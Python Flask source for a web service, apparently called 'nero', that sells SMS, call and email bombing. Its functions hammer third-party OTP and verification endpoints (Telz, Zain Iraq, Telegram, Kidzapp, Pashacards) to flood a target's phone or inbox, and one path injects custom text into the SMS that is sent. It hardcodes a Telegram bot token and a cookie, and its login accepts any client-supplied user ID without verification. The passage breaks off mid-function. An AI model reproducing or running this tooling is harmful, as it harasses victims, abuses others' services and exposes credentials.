"""
موقع بوت nero - يحتفظ بنفس منطق البوت الأصلي
يشتغل مع نفس قاعدة بيانات telz_bot.db حتى يعمل البوت والموقع معاً
"""
import sqlite3
import threading
import uuid
import time
import base64
import hashlib
import os
import logging
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, request, jsonify, session, render_template, Response
import requests

# ==================== إعدادات ====================
app = Flask(__name__, static_folder='static', template_folder='templates')
app.secret_key = os.environ.get("SECRET_KEY", "change_me_to_random_secret")
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['MAX_CONTENT_LENGTH'] = 4 * 1024 * 1024  # 4MB max upload

DB_PATH = "telz_bot.db"
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8843943729:AAFaI9SMN9Y12h6CmmUHKJk1AqmwMt6bHic")
PAYMENT_USERNAME = "8738103314"
OWNER_IDS = [8738103314]

MAX_WORKERS = 500
db_lock = threading.RLock()

DEFAULT_LIMITS = {
    "call": 5, "spam_asia": 10, "spam_ether": 10,
    "spam_telegram": 5, "spam_email": 10,
}

BUTTONS_DEFAULT = {
    "call": True, "spam_asia": True, "spam_ether": True,
    "spam_telegram": True, "spam_email": True, "referral": True,
}

VALID_SERVICES = {"call", "spam_asia", "spam_ether", "spam_telegram", "spam_email"}
VALID_LANGS = {"ar", "en", "ku"}

GREEN, RED = "🟢", "🔴"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


# ==================== قاعدة البيانات ====================
def get_conn():
    return sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)


def init_db():
    with db_lock:
        conn = get_conn()
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA synchronous=NORMAL")
        conn.execute("PRAGMA cache_size=10000")
        c = conn.cursor()

        c.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, phone TEXT,
            is_vip INTEGER DEFAULT 0, vip_expiry TEXT, join_date TEXT,
            is_admin INTEGER DEFAULT 0, extra_tokens INTEGER DEFAULT 0,
            extra_tokens_expiry TEXT, points INTEGER DEFAULT 0,
            referrer_id INTEGER DEFAULT NULL, referral_count INTEGER DEFAULT 0,
            theme TEXT DEFAULT 'dark', lang TEXT DEFAULT 'ar',
            fav_services TEXT DEFAULT '')''')

        c.execute('''CREATE TABLE IF NOT EXISTS referral_links (
            user_id INTEGER PRIMARY KEY, link_code TEXT UNIQUE,
            total_clicks INTEGER DEFAULT 0, total_registered INTEGER DEFAULT 0)''')

        c.execute('''CREATE TABLE IF NOT EXISTS user_daily_limits (
            user_id INTEGER, service TEXT, used_today INTEGER DEFAULT 0,
            last_reset TEXT, PRIMARY KEY (user_id, service))''')

        c.execute('''CREATE TABLE IF NOT EXISTS calls_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, phone TEXT,
            call_time TEXT, status TEXT, response TEXT)''')

        c.execute('''CREATE TABLE IF NOT EXISTS spam_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, phone TEXT,
            service TEXT, count INTEGER, success_count INTEGER,
            fail_count INTEGER, spam_time TEXT, status TEXT)''')

        c.execute('''CREATE TABLE IF NOT EXISTS daily_stats (
            date TEXT PRIMARY KEY, total_calls INTEGER DEFAULT 0,
            total_spam INTEGER DEFAULT 0, unique_users INTEGER DEFAULT 0)''')

        c.execute('''CREATE TABLE IF NOT EXISTS force_channels (
            channel_id TEXT PRIMARY KEY, channel_username TEXT)''')

        c.execute('''CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY, value TEXT)''')

        c.execute('''CREATE TABLE IF NOT EXISTS broadcasts (
            id INTEGER PRIMARY KEY AUTOINCREMENT, target_user_id INTEGER,
            message TEXT, created_at TEXT)''')

        c.execute('''CREATE TABLE IF NOT EXISTS transfer_requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT, from_user INTEGER, to_user INTEGER,
            amount INTEGER, service TEXT, status TEXT, created_at TEXT)''')

        c.execute('''CREATE TABLE IF NOT EXISTS support_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
            from_admin INTEGER DEFAULT 0, message TEXT, created_at TEXT,
            read_by_user INTEGER DEFAULT 0)''')

        c.execute('''CREATE TABLE IF NOT EXISTS notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
            icon TEXT, title TEXT, body TEXT, created_at TEXT,
            read INTEGER DEFAULT 0)''')

        c.execute('''CREATE TABLE IF NOT EXISTS push_subscriptions (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
            endpoint TEXT UNIQUE, p256dh TEXT, auth TEXT, created_at TEXT)''')

        # ---- ترقية جداول قديمة (إضافة أعمدة بأمان) ----
        for col, ddl in [
            ("theme", "TEXT DEFAULT 'dark'"),
            ("lang", "TEXT DEFAULT 'ar'"),
            ("fav_services", "TEXT DEFAULT ''"),
        ]:
            try:
                c.execute(f"ALTER TABLE users ADD COLUMN {col} {ddl}")
            except Exception:
                pass  # العمود موجود مسبقاً

        for service, limit in DEFAULT_LIMITS.items():
            c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)",
                      (f"limit_{service}", str(limit)))
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('call_wait', '30')")
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('referral_points', '1')")
        for k, v in BUTTONS_DEFAULT.items():
            c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)",
                      (f"btn_{k}", "1" if v else "0"))
        conn.commit()
        conn.close()
        logger.info("✅ قاعدة البيانات جاهزة")


init_db()


# ==================== أدوات مساعدة ====================
def generate_referral_code(user_id):
    code = hashlib.md5(f"{user_id}{uuid.uuid4()}{time.time()}".encode()).hexdigest()[:10]
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO referral_links (user_id, link_code) VALUES (?, ?)',
                  (user_id, code))
        conn.commit()
        conn.close()
    return code


def get_referral_code(user_id):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT link_code FROM referral_links WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return r[0] if r else generate_referral_code(user_id)


def get_user_points(user_id):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT points FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return (r[0] if r and r[0] is not None else 0)


def get_referral_count(user_id):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT referral_count FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return r[0] if r and r[0] is not None else 0


def get_referral_stats(user_id):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT total_clicks, total_registered FROM referral_links WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return (r[0] or 0, r[1] or 0) if r else (0, 0)


def update_referral_click(link_code):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE referral_links SET total_clicks = total_clicks + 1 WHERE link_code = ?', (link_code,))
        conn.commit()
        conn.close()


def update_user_points(user_id, delta):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE users SET points = points + ? WHERE user_id = ?', (delta, user_id))
        conn.commit()
        conn.close()


def is_owner(user_id):
    return user_id in OWNER_IDS


def is_admin(user_id):
    if is_owner(user_id):
        return True
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT is_admin FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return bool(r and r[0] == 1)


def is_vip(user_id):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT is_vip, vip_expiry FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r and r[0] == 1:
        if r[1]:
            try:
                return datetime.strptime(r[1], '%Y-%m-%d') >= datetime.now()
            except Exception:
                return True
        return True
    return False


def get_extra_tokens(user_id):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT extra_tokens, extra_tokens_expiry FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r and r[0] and r[1]:
        try:
            if datetime.strptime(r[1], '%Y-%m-%d %H:%M:%S') >= datetime.now():
                return r[0]
        except Exception:
            pass
    return 0


def get_setting(key, default=None):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT value FROM settings WHERE key = ?', (key,))
        r = c.fetchone()
        conn.close()
    return r[0] if r else default


def set_setting(key, value):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, str(value)))
        conn.commit()
        conn.close()


def get_buttons_status():
    return {k: get_setting(f"btn_{k}", "1") == "1" for k in BUTTONS_DEFAULT}


def get_service_limit(user_id, service):
    if is_vip(user_id):
        return 999999
    free = int(get_setting(f"limit_{service}", DEFAULT_LIMITS.get(service, 5)))
    return free + get_extra_tokens(user_id)


def get_used_today(user_id, service):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT used_today, last_reset FROM user_daily_limits WHERE user_id = ? AND service = ?',
                  (user_id, service))
        r = c.fetchone()
        conn.close()
    today = datetime.now().strftime('%Y-%m-%d')
    return r[0] if (r and r[1] == today) else 0


def increment_used(user_id, service, count=1):
    today = datetime.now().strftime('%Y-%m-%d')
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''INSERT INTO user_daily_limits (user_id, service, used_today, last_reset)
                     VALUES (?, ?, ?, ?)
                     ON CONFLICT(user_id, service) DO UPDATE SET
                     used_today = used_today + ?, last_reset = ?''',
                  (user_id, service, count, today, count, today))
        conn.commit()
        conn.close()


def can_use_service(user_id, service):
    used = get_used_today(user_id, service)
    limit = get_service_limit(user_id, service)
    return used < limit, limit - used


def add_call_log(user_id, phone, status, response="", count=1):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('INSERT INTO calls_log (user_id, phone, call_time, status, response) VALUES (?, ?, ?, ?, ?)',
                  (user_id, phone, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), status, str(response)[:500]))
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE daily_stats SET total_calls = total_calls + ? WHERE date = ?', (count, today))
        if c.rowcount == 0:
            c.execute('INSERT INTO daily_stats (date, total_calls, total_spam, unique_users) VALUES (?, ?, 0, 0)',
                      (today, count))
        conn.commit()
        conn.close()


def add_spam_log(user_id, phone, service, count, success, failed, status):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''INSERT INTO spam_log (user_id, phone, service, count, success_count, fail_count, spam_time, status)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                  (user_id, phone, service, count, success, failed,
                   datetime.now().strftime('%Y-%m-%d %H:%M:%S'), status))
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE daily_stats SET total_spam = total_spam + ? WHERE date = ?', (count, today))
        if c.rowcount == 0:
            c.execute('INSERT INTO daily_stats (date, total_calls, total_spam, unique_users) VALUES (?, 0, ?, 0)',
                      (today, count))
        conn.commit()
        conn.close()


def add_notification(user_id, icon, title, body=""):
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''INSERT INTO notifications (user_id, icon, title, body, created_at)
                     VALUES (?, ?, ?, ?, ?)''',
                  (user_id, icon, title, body, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        conn.commit()
        conn.close()


def reset_daily_limits():
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE user_daily_limits SET used_today = 0, last_reset = ? WHERE last_reset != ?', (today, today))
        conn.commit()
        conn.close()


# ==================== خدمات الاتصال والسبام ====================
def telz_call_real(phone):
    android_id = uuid.uuid4().hex[:16]
    uid = str(uuid.uuid4())
    headers = {"User-Agent": "Telz-Android/17.5.48", "Content-Type": "application/json; charset=UTF-8"}
    try:
        requests.post("https://api.telz.com/app/auth_list", json={
            "android_id": android_id, "app_version": "17.5.48", "event": "auth_list",
            "os": "android", "os_version": "15", "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        requests.post("https://api.telz.com/app/run", json={
            "android_id": android_id, "app_version": "17.5.48", "device_name": "",
            "event": "run", "ipv4_address": "", "lang": "ar", "network_country": "iq",
            "network_type": "WIFI", "os": "android", "os_version": "15", "push_token": "",
            "roaming": "no", "root": "no", "run_id": str(int(time.time())),
            "sim_country": "iq", "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        requests.post("https://api.telz.com/app/validate_phonenumber", json={
            "android_id": android_id, "app_version": "17.5.48", "event": "validate_phonenumber",
            "os": "android", "os_version": "15", "phone": phone, "region": "IQ",
            "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        time.sleep(0.5)
        r4 = requests.post("https://api.telz.com/app/auth_call", json={
            "android_id": android_id, "app_version": "17.5.48", "attempt": "0",
            "event": "auth_call", "lang": "ar", "os": "android", "os_version": "15",
            "phone": phone, "ts": int(time.time() * 1000), "uuid": uid,
            "run_id": str(int(time.time() * 1000))
        }, headers=headers, timeout=5)
        result = r4.json()
        if result.get('status') == 'ok':
            return True, "✅ تم إرسال المكالمة بنجاح"
        elif result.get('reason') == '3.1':
            return False, "⚠️ الرقم مسجل مسبقاً"
        return False, "❌ فشل إرسال المكالمة"
    except Exception as e:
        return False, f"❌ خطأ: {str(e)[:30]}"


def send_ether_spam_real(phone, count):
    success, failed = 0, 0
    for _ in range(min(count, 50)):
        try:
            r = requests.post("https://mw-mobileapp.iq.zain.com/api/otp/request",
                              json={"msisdn": phone},
                              headers={'User-Agent': "okhttp/4.11.0", 'Content-Type': "application/json"},
                              timeout=5)
            if r.status_code in (200, 201, 202):
                success += 1
            else:
                failed += 1
        except Exception:
            failed += 1
        time.sleep(0.1)
    return success, failed


def send_telegram_spam_real(phone, count):
    success, failed = 0, 0
    cookies = {'stel_ln': 'ar',
               'stel_acid': 'FrtmvJBwZdq7sey4JzSCm0bwhg97BgwnV5sFftSz09zwfRILdgH_sEVFAIp0KIpM'}
    for _ in range(min(count, 30)):
        try:
            r = requests.post('https://my.telegram.org/auth/send_password',
                              cookies=cookies, data={'phone': phone}, timeout=5)
            if '"random_hash"' in r.text:
                success += 1
            else:
                failed += 1
        except Exception:
            failed += 1
        time.sleep(0.15)
    return success, failed


def send_gmail_spam_real(email, count):
    success, failed = 0, 0
    for _ in range(min(count, 50)):
        try:
            r = requests.post('https://api.kidzapp.com/api/3.0/customlogin/',
                              json={'email': email, 'sdk': 'web', 'platform': 'desktop'}, timeout=5)
            if '"EMAIL SENT"' in r.text:
                success += 1
            else:
                failed += 1
        except Exception:
            failed += 1
        time.sleep(0.1)
    return success, failed


def send_asia_spam_real(phone, count, message):
    success, failed = 0, 0
    name = base64.b64decode('2ZjZrNmA').decode()
    for _ in range(min(count, 100)):
        try:
            data = {'action': 'send_pin_code', 'msisdn': phone, 'appId': '3',
                    'packageName': name + message, 'paymentMethodId': '3'}
            r = requests.post('https://pashacards.net/wp-admin/admin-ajax.php', data=data, timeout=5)
            if '"success":true' in r.text:
                success += 1
            else:
                failed += 1
        except Exception:
            failed += 1
        time.sleep(0.1)
    return success, failed


# ==================== ديكوريترز ====================
def login_required(f):
    @wraps(f)
    def wrapper(*a, **k):
        if not session.get('user_id'):
            return jsonify({"error": "يجب تسجيل الدخول أولاً"}), 401
        return f(*a, **k)
    return wrapper


def admin_required(f):
    @wraps(f)
    def wrapper(*a, **k):
        uid = session.get('user_id')
        if not uid or not is_admin(uid):
            return jsonify({"error": "هذه الصفحة للأدمن فقط"}), 403
        return f(*a, **k)
    return wrapper


def owner_required(f):
    @wraps(f)
    def wrapper(*a, **k):
        uid = session.get('user_id')
        if not uid or not is_owner(uid):
            return jsonify({"error": "هذه الصفحة للمالك فقط"}), 403
        return f(*a, **k)
    return wrapper


# ==================== المسارات ====================
@app.route('/')
def index():
    return render_template('index.html')


@app.route('/sw.js')
def service_worker():
    sw = r"""
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
self.addEventListener('push', e => {
  let d = {};
  try { d = e.data ? e.data.json() : {}; } catch(_) {}
  const title = d.title || 'nero';
  const body  = d.body  || '';
  e.waitUntil(self.registration.showNotification(title, {
    body, icon: d.icon || '/static/icon.png', badge: '/static/icon.png', data: d
  }));
});
self.addEventListener('notificationclick', e => {
  e.notification.close();
  e.waitUntil(clients.matchAll({type:'window'}).then(cs => {
    for (const c of cs) if ('focus' in c) return c.focus();
    if (clients.openWindow) return clients.openWindow('/');
  }));
});
"""
    return Response(sw, mimetype='application/javascript')


@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json() or {}
    try:
        user_id = int(data.get('user_id', 0))
    except Exception:
        return jsonify({"error": "معرّف المستخدم غير صحيح"}), 400
    if user_id <= 0:
        return jsonify({"error": "معرّف المستخدم غير صحيح"}), 400

    first_name = (data.get('first_name') or f"User{user_id}").strip()[:64]
    username = (data.get('username') or "").strip()[:64] or None
    ref_code = (data.get('ref') or "").strip()

    referrer_id = None
    if ref_code:
        update_referral_click(ref_code)
        with db_lock:
            conn = get_conn()
            c = conn.cursor()
            c.execute('SELECT user_id FROM referral_links WHERE link_code = ?', (ref_code,))
            r = c.fetchone()
            conn.close()
        if r:
            referrer_id = r[0]

    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT user_id FROM users WHERE user_id = ?', (user_id,))
        existing = c.fetchone()
        today = datetime.now().strftime('%Y-%m-%d')
        if not existing:
            if referrer_id and referrer_id != user_id:
                c.execute('''INSERT INTO users (user_id, username, first_name, join_date, points, referrer_id, referral_count)
                             VALUES (?, ?, ?, ?, 1, ?, 0)''',
                          (user_id, username, first_name, today, referrer_id))
                c.execute('UPDATE users SET points = points + 1, referral_count = referral_count + 1 WHERE user_id = ?',
                          (referrer_id,))
                c.execute('UPDATE referral_links SET total_registered = total_registered + 1 WHERE user_id = ?',
                          (referrer_id,))
            else:
                c.execute('''INSERT INTO users (user_id, username, first_name, join_date, points, referrer_id, referral_count)
                             VALUES (?, ?, ?, ?, 1, NULL, 0)''',
                          (user_id, username, first_name, today))
            c.execute('INSERT OR IGNORE INTO daily_stats (date, total_calls, total_spam, unique_users) VALUES (?, 0, 0, 0)',
                      (today,))
            c.execute('UPDATE daily_stats SET unique_users = unique_users + 1 WHERE date = ?', (today,))
        conn.commit()
        conn.close()

    session.permanent = True
    session['user_id'] = user_id
    return jsonify({"ok": True, "user_id": user_id})


@app.route('/api/logout', methods=['POST'])
def api_logout():
    session.clear()
    return jsonify({"ok": True})


@app.route('/api/me')
@login_required
def api_me():
    uid = session['user_id']
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT first_name, username, join_date, theme, lang, fav_services FROM users WHERE user_id = ?', (uid,))
        u = c.fetchone()
        c.execute('SELECT COUNT(*) FROM calls_log WHERE user_id = ?', (uid,))
        total_calls = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM spam_log WHERE user_id = ?', (uid,))
        total_spam = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM notifications WHERE user_id = ? AND read = 0', (uid,))
        unread_notifs = c.fetchone()[0]
        conn.close()
    clicks, registered = get_referral_stats(uid)
    favs = [f for f in ((u[5] if u and u[5] else '') or '').split(',') if f]
    return jsonify({
        "user_id": uid,
        "first_name": u[0] if u else "—",
        "username": u[1] if u else None,
        "join_date": u[2] if u else "—",
        "theme": (u[3] if u and u[3] else "dark"),
        "lang": (u[4] if u and u[4] else "ar"),
        "fav_services": favs,
        "points": get_user_points(uid),
        "referrals": get_referral_count(uid),
        "clicks": clicks,
        "registered": registered,
        "is_vip": is_vip(uid),
        "is_admin": is_admin(uid),
        "is_owner": is_owner(uid),
        "extra_tokens": get_extra_tokens(uid),
        "total_calls": total_calls,
        "total_spam": total_spam,
        "unread_notifications": unread_notifs,
        "payment_username": PAYMENT_USERNAME,
    })


@app.route('/api/theme', methods=['POST'])
@login_required
def api_theme():
    data = request.get_json() or {}
    theme = data.get('theme', 'dark')
    if theme not in ('dark', 'light', 'cyberpunk', 'ocean', 'forest'):
        return jsonify({"error": "ثيم غير صحيح"}), 400
    uid = session['user_id']
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE users SET theme = ? WHERE user_id = ?', (theme, uid))
        conn.commit()
        conn.close()
    return jsonify({"ok": True, "theme": theme})


@app.route('/api/lang', methods=['POST'])
@login_required
def api_lang():
    data = request.get_json() or {}
    lang = data.get('lang', 'ar')
    if lang not in VALID_LANGS:
        return jsonify({"error": "لغة غير مدعومة"}), 400
    uid = session['user_id']
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE users SET lang = ? WHERE user_id = ?', (lang, uid))
        conn.commit()
        conn.close()
    return jsonify({"ok": True, "lang": lang})


@app.route('/api/favorites', methods=['GET', 'POST'])
@login_required
def api_favorites():
    uid = session['user_id']
    if request.method == 'POST':
        data = request.get_json() or {}
        favs = data.get('favorites', [])
        if not isinstance(favs, list):
            return jsonify({"error": "قائمة غير صحيحة"}), 400
        # منع التكرار + حد أقصى 5 + فقط خدمات صحيحة
        seen = []
        for f in favs:
            if f in VALID_SERVICES and f not in seen:
                seen.append(f)
        seen = seen[:5]
        with db_lock:
            conn = get_conn()
            c = conn.cursor()
            c.execute('UPDATE users SET fav_services = ? WHERE user_id = ?', (','.join(seen), uid))
            conn.commit()
            conn.close()
        return jsonify({"ok": True, "favorites": seen})
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT fav_services FROM users WHERE user_id = ?', (uid,))
        r = c.fetchone()
        conn.close()
    favs = [f for f in ((r[0] if r and r[0] else '') or '').split(',') if f]
    return jsonify({"favorites": favs})


@app.route('/api/search')
@login_required
def api_search():
    uid = session['user_id']
    q = (request.args.get('q') or '').strip()
    if not q:
        return jsonify({"results": []})
    results = []
    like = f"%{q}%"
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''SELECT 'call' AS kind, phone, status, call_time FROM calls_log
                     WHERE user_id = ? AND (phone LIKE ? OR status LIKE ?)
                     ORDER BY id DESC LIMIT 20''', (uid, like, like))
        for r in c.fetchall():
            results.append({"type": "history", "kind": r[0], "title": r[1],
                            "subtitle": r[2], "time": r[3]})
        c.execute('''SELECT 'spam' AS kind, phone, status, spam_time FROM spam_log
                     WHERE user_id = ? AND (phone LIKE ? OR service LIKE ?)
                     ORDER BY id DESC LIMIT 20''', (uid, like, like))
        for r in c.fetchall():
            results.append({"type": "history", "kind": r[0], "title": r[1],
                            "subtitle": r[2], "time": r[3]})
        if is_admin(uid):
            c.execute('''SELECT user_id, first_name, username FROM users
                         WHERE CAST(user_id AS TEXT) LIKE ?
                            OR first_name LIKE ?
                            OR username LIKE ?
                         LIMIT 20''', (like, like, like))
            for r in c.fetchall():
                results.append({"type": "user", "user_id": r[0],
                                "title": r[1] or f"User{r[0]}",
                                "subtitle": f"@{r[2]}" if r[2] else str(r[0])})
        conn.close()
    return jsonify({"results": results[:40]})


@app.route('/api/push/subscribe', methods=['POST'])
@login_required
def api_push_subscribe():
    uid = session['user_id']
    data = request.get_json() or {}
    endpoint = data.get('endpoint')
    keys = data.get('keys') or {}
    if not endpoint:
        return jsonify({"error": "بيانات ناقصة"}), 400
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO push_subscriptions
                     (user_id, endpoint, p256dh, auth, created_at)
                     VALUES (?, ?, ?, ?, ?)''',
                  (uid, endpoint, keys.get('p256dh', ''), keys.get('auth', ''),
                   datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        conn.commit()
        conn.close()
    return jsonify({"ok": True})


@app.route('/api/push/unsubscribe', methods=['POST'])
@login_required
def api_push_unsubscribe():
    uid = session['user_id']
    data = request.get_json() or {}
    endpoint = data.get('endpoint')
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        if endpoint:
            c.execute('DELETE FROM push_subscriptions WHERE user_id = ? AND endpoint = ?', (uid, endpoint))
        else:
            c.execute('DELETE FROM push_subscriptions WHERE user_id = ?', (uid,))
        conn.commit()
        conn.close()
    return jsonify({"ok": True})


@app.route('/api/services')
@login_required
def api_services():
    uid = session['user_id']
    btns = get_buttons_status()
    out = {}
    for s in VALID_SERVICES:
        used = get_used_today(uid, s)
        limit = get_service_limit(uid, s)
        out[s] = {
            "enabled": btns.get(s, True),
            "used": used,
            "limit": limit,
            "remaining": max(0, limit - used),
        }
    return jsonify({"services": out, "referral_enabled": btns.get("referral", True)})


@app.route('/api/call', methods=['POST'])
@login_required
def api_call():
    uid = session['user_id']
    if not get_buttons_status().get("call", True):
        return jsonify({"error": "خدمة الاتصال في وضع الصيانة"}), 400
    data = request.get_json() or {}
    phone = (data.get('phone') or '').strip()
    if not phone.startswith('+'):
        return jsonify({"error": "الرقم يجب أن يبدأ بـ +"}), 400

    # ---- التكرار (VIP فقط، 1-5) ----
    try:
        repeat = int(data.get('repeat', 1))
    except Exception:
        repeat = 1
    repeat = max(1, min(repeat, 5))

    if repeat > 1 and not is_vip(uid):
        return jsonify({"error": "👑 التكرار المتعدد متاح فقط لمشتركي VIP"}), 403

    can, remaining = can_use_service(uid, "call")
    if not can:
        return jsonify({"error": "انتهت محاولاتك اليومية", "remaining": 0}), 400
    if remaining < repeat:
        return jsonify({"error": f"محاولاتك غير كافية (تحتاج {repeat}، المتبقي {remaining})"}), 400

    success_count = 0
    failed_count = 0
    last_msg = ""

    for i in range(repeat):
        success, msg = telz_call_real(phone)
        last_msg = msg
        if success:
            success_count += 1
        else:
            failed_count += 1
        if i < repeat - 1:
            time.sleep(0.3)

    increment_used(uid, "call", repeat)
    add_call_log(
        uid, phone,
        f'نجحت x{success_count}' if success_count > 0 else 'فشل',
        f"repeat={repeat}, success={success_count}, failed={failed_count}",
        count=repeat
    )

    return jsonify({
        "ok": success_count > 0,
        "success": success_count,
        "failed": failed_count,
        "repeat": repeat,
        "message": (f"✅ تم إرسال {success_count}/{repeat} مكالمة"
                    if success_count > 0
                    else f"❌ فشل الإرسال — {last_msg}"),
        "used": get_used_today(uid, "call"),
        "limit": get_service_limit(uid, "call"),
    })


@app.route('/api/spam', methods=['POST'])
@login_required
def api_spam():
    uid = session['user_id']
    data = request.get_json() or {}
    spam_type = data.get('type', '')
    target = (data.get('target') or '').strip().replace(' ', '')
    try:
        count = int(data.get('count', 1))
    except Exception:
        return jsonify({"error": "عدد غير صحيح"}), 400
    count = max(1, min(count, 50))

    type_map = {
        'ether': ('spam_ether', send_ether_spam_real, 'اثير'),
        'telegram': ('spam_telegram', send_telegram_spam_real, 'تيليجرام'),
        'email': ('spam_email', send_gmail_spam_real, 'جيميل'),
        'asia': ('spam_asia', None, 'آسيا'),
    }
    if spam_type not in type_map:
        return jsonify({"error": "نوع سبام غير معروف"}), 400

    service, func, name = type_map[spam_type]

    if not get_buttons_status().get(service, True):
        return jsonify({"error": f"خدمة {name} في وضع الصيانة"}), 400

    # ---- الوضع الجماعي للإيميل ----
    if spam_type == 'email' and data.get('bulk'):
        emails = data.get('targets') or []
        if not isinstance(emails, list) or len(emails) == 0:
            return jsonify({"error": "لا توجد إيميلات"}), 400
        emails = [str(e).strip() for e in emails if '@' in str(e)][:200]
        if not emails:
            return jsonify({"error": "لا توجد إيميلات صحيحة"}), 400

        can, remaining = can_use_service(uid, service)
        if not can or remaining < len(emails):
            return jsonify({"error": f"محاولاتك غير كافية (تحتاج {len(emails)}، المتبقي {remaining})"}), 400

        total_ok, total_fail = 0, 0
        for em in emails:
            s, f = send_gmail_spam_real(em, 1)
            total_ok += s
            total_fail += f

        increment_used(uid, service, len(emails))
        add_spam_log(uid, f"bulk:{len(emails)}", service, len(emails), total_ok, total_fail,
                     'نجح' if total_ok > 0 else 'فشل')
        return jsonify({
            "ok": True, "success": total_ok, "failed": total_fail,
            "percent": int(total_ok / max(total_ok + total_fail, 1) * 100),
            "used": get_used_today(uid, service),
            "limit": get_service_limit(uid, service),
            "bulk_count": len(emails),
        })

    if spam_type == 'email':
        if '@' not in target:
            return jsonify({"error": "ايميل غير صحيح"}), 400
    elif spam_type == 'telegram':
        if not target.startswith('+'):
            return jsonify({"error": "الرقم يجب أن يبدأ بـ +"}), 400
    else:
        if not target:
            return jsonify({"error": "أرسل الرقم"}), 400

    can, remaining = can_use_service(uid, service)
    if not can or remaining < count:
        return jsonify({"error": f"محاولاتك غير كافية (المتبقي: {remaining})"}), 400

    if spam_type == 'asia':
        message = (data.get('message') or '').strip()
        if not message:
            return jsonify({"error": "أرسل الرسالة"}), 400
        success, failed = send_asia_spam_real(target, count, message)
    else:
        success, failed = func(target, count)

    increment_used(uid, service, count)
    add_spam_log(uid, target, service, count, success, failed,
                 'نجح' if success > 0 else 'فشل')
    total = success + failed or 1
    return jsonify({
        "ok": True, "success": success, "failed": failed,
        "percent": int(success / total * 100),
        "used": get_used_today(uid, service),
        "limit": get_service_limit(uid, service),
    })


@app.route('/api/redeem', methods=['POST'])
@login_required
def api_redeem():
    uid = session['user_id']
    data = request.get_json() or {}
    service = data.get('service', 'call')
    if service not in VALID_SERVICES:
        return jsonify({"error": "خدمة غير صحيحة"}), 400
    if get_user_points(uid) < 1:
